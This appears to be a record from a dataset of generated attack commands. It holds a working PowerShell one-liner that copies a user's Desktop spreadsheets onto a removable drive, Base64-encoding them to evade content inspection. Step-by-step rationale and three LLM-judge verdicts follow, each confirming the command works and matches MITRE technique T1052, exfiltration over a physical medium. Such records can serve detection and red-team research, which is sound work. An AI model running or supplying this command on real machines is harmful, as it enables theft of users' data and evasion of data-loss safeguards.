command: $dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest="$dl`:\cache"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem "$env:USERPROFILE\Desktop" -Include *.xlsx,*.csv -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [Convert]::ToBase64String($b) | Set-Content -Path (Join-Path $dest ($_.BaseName + ".b64")) -Encoding ascii }; Write-Output "Base64-archived Desktop data to $dest at $(Get-Date)" | Out-File "$dest\op.log" -Append
explanation: Base64-encodes spreadsheet data and stores it on a removable drive to evade simple content inspection while keeping all operations local.
rationale_steps: Locate a removable drive for staging
Enumerate spreadsheet files from the Desktop
Read bytes and encode data to Base64 before writing to USB
Log the local operation using Write-Output

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced delimiters, valid cmdlets/parameters (e.g., Select -First -Expand for DriveLetter), proper separators, and correct escaping to construct the removable drive path.
llm_judgments.semantic_justification: It identifies a removable drive, creates a staging directory, base64-encodes Desktop spreadsheet files, writes them to the removable media, and logs the action—consistent with T1052 exfiltration over physical medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses/braces, correct variable assignments, pipeline operations, and error handling.
llm_judgments.semantic_justification: The command fully implements the T1052 technique by automatically detecting a removable drive, copying spreadsheet files from the user's desktop, encoding them as base64 to evade simple content inspection, and logging the operation - all core elements of exfiltration over physical medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed, uses valid PowerShell syntax, balanced parentheses and quotes, and proper command separators and flags.
llm_judgments.semantic_justification: The command perfectly aligns with the claimed intent and T1052 by identifying a removable drive, Base64-encoding target files, and saving them to the removable drive, effectively demonstrating exfiltration over a physical medium with obfuscation.
